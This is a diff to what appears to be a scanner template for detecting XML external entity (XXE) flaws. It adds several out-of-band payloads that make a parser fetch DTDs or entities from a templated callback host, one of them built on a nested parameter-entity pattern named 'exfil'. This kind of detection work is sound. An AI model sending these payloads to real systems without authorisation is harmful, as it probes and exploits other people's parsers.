@@ -25,6 +25,15 @@ tests: tests/fixtures/xxe-oob/
 request:
   method: POST
   param_names: ["xml", "data", "payload", "content", "body", "input", "file"]
+  # Callback-only corpus: each variant makes the parser resolve one unique
+  # OOB hostname (entity fetch, external DTD, PUBLIC DTD, nested parameter
+  # entity). No file:// targets, no local file reads, no data exfiltration:
+  # the only evidence is the operator's own callback.
   payload: '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{{OOB_DOMAIN}}/xxe"> %xxe;]><foo/>'
+  payloads:
+    - '<!DOCTYPE foo SYSTEM "http://{{OOB_DOMAIN}}/xxe.dtd"><foo/>'
+    - '<!DOCTYPE foo PUBLIC "-//GASH//EN" "http://{{OOB_DOMAIN}}/xxe.dtd"><foo/>'
+    - '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{OOB_URL}}xxe?c={{CORRELATION}}"> %xxe;]><foo/>'
+    - '<!DOCTYPE foo [<!ENTITY % file SYSTEM "http://{{OOB_DOMAIN}}/xxe-err"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM ''http://{{OOB_DOMAIN}}/xxe2''">"> %eval; %exfil;]><foo/>'
 oracle:
   name: oob
